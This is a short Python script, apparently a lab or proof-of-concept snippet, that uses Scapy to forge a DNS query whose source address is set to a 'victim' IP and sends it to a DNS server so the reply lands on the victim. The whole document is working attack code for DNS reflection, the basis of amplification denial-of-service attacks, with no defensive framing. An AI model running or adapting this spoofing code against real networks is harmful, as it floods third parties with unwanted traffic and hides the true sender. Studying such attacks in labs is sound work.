from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import send

victim_ip = "10.0.0.10"
target_dns_server = "10.0.1.10"
query_domain = "example.com"

dns_req_packet = (
    IP(src=victim_ip, dst=target_dns_server)
    / UDP()
    / DNS(rd=1, qd=DNSQR(qname=query_domain))
)

send(dns_req_packet)
